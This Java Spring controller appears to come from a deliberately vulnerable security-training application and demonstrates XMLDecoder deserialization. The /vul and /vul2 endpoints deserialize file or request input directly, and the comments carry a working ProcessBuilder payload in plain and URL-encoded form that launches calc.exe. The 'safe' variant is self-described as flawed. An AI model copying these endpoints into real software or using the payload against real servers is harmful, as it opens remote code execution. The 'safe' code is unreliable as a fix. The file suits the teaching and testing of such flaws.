package com.madaha.codesecone.controller.AdvancedAttack.deserialize;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.beans.XMLDecoder;
import java.beans.XMLEncoder;
import java.io.*;
import java.util.HashMap;

@RestController
@RequestMapping("/Deserialize/XMLDecoder")
public class XMLDecoderVul {

    private final String path = "src/main/resources/static/evil/xmldecoder/payloadWin.xml";

    /**
     * XMLDecoder 是JDK的一个对象XML的工具。所以本质上 XMLEncoder 与 XMLDecoder 也是一种序列化（编码）与反序列化（解码）的操作。
     *
     * @payload
     * @poc
     */

    public static void main(String args[]){
        HashMap<Object, Object> map = new HashMap<>();
        map.put("name", "zhangsan");
        map.put("age", new String[]{"a", "b", "c"});

        // XMLDecoder 生成的 XML 序列化文档表示对象
        XMLEncoder xmlEncoder = new XMLEncoder(System.out);
        xmlEncoder.writeObject(map);
        xmlEncoder.close();
    }


    /**
     * @poc http://127.0.0.1:28888/Deserialize/XMLDecoder/vul
     * @payload
        <?xml version="1.0" encoding="UTF-8"?>
        <java version="1.8.0_361" class="java.beans.XMLDecoder">
            <object class="java.lang.ProcessBuilder">
                <array class="java.lang.String" length="1">
                    <void index="0">
                        <string>calc.exe</string>
                    </void>
                </array>
                <void method="start"></void>
            </object>
        </java>
     */
    @RequestMapping("/vul")
    public void vul(){
        File file = new File(path);
        FileInputStream fis = null;

        try{
            fis = new FileInputStream(file);
        }catch (Exception e){
            e.printStackTrace();
        }

        BufferedInputStream bis = new BufferedInputStream(fis);
        XMLDecoder xmlDecoder = new XMLDecoder(bis);
        xmlDecoder.readObject();
        xmlDecoder.close();
    }


    /**
     * @poc  http://127.0.0.1:28888/Deserialize/XMLDecoder/vul2?content=%3C?xml%20version=%221.0%22%20encoding=%22UTF-8%22?%3E%0A%3Cjava%20version=%221.8.0_361%22%20class=%22java.beans.XMLDecoder%22%3E%0A%20%20%20%20%3Cobject%20class=%22java.lang.ProcessBuilder%22%3E%0A%20%20%20%20%20%20%20%20%3Carray%20class=%22java.lang.String%22%20length=%221%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cvoid%20index=%220%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cstring%3Ecalc.exe%3C/string%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/void%3E%0A%20%20%20%20%20%20%20%20%3C/array%3E%0A%20%20%20%20%20%20%20%20%3Cvoid%20method=%22start%22%3E%3C/void%3E%0A%20%20%20%20%3C/object%3E%0A%3C/java%3E
     * @poc_decode  http://127.0.0.1:28888/Deserialize/XMLDecoder/vul2?content=<?xml version="1.0" encoding="UTF-8"?>
                                <java version="1.8.0_361" class="java.beans.XMLDecoder">
                                <object class="java.lang.ProcessBuilder">
                                <array class="java.lang.String" length="1">
                                <void index="0">
                                <string>calc.exe</string>
                                </void>
                                </array>
                                <void method="start"></void>
                                </object>
                                </java>
     * @param content
     */
    @RequestMapping("/vul2")
    public void vul2(String content){
        InputStream is = null;
        try{
            is = new ByteArrayInputStream(content.getBytes());
        }catch (Exception e){
            e.printStackTrace();
        }

        BufferedInputStream bis = new BufferedInputStream(is);
        XMLDecoder xmlDecoder = new XMLDecoder(bis);
        xmlDecoder.readObject();
        xmlDecoder.close();
    }


    /**
     * 注意：此处的逻辑是有问题的
     *
     * 替换 XMLDecoder 类，使用更安全的 ObjectInputStream.readUnshared
     *
     * 注意：这里是不让使用XMLDecoder进行反序列化，需要使用 ObjectInputStream.readUnshared() 进行反序列化操作
     */
    @GetMapping("/safe")
    public void safe() throws IOException, ClassNotFoundException{
        File file = new File(path);
        FileInputStream fis = null;

        try{
            fis = new FileInputStream(path);
        }catch (Exception e){
            e.printStackTrace();
        }

        BufferedInputStream bis = new BufferedInputStream(fis);
        ObjectInputStream ois = new ObjectInputStream(bis);
        Object obj = ois.readUnshared();
        ois.close();

        System.out.println(obj.toString());
    }
}
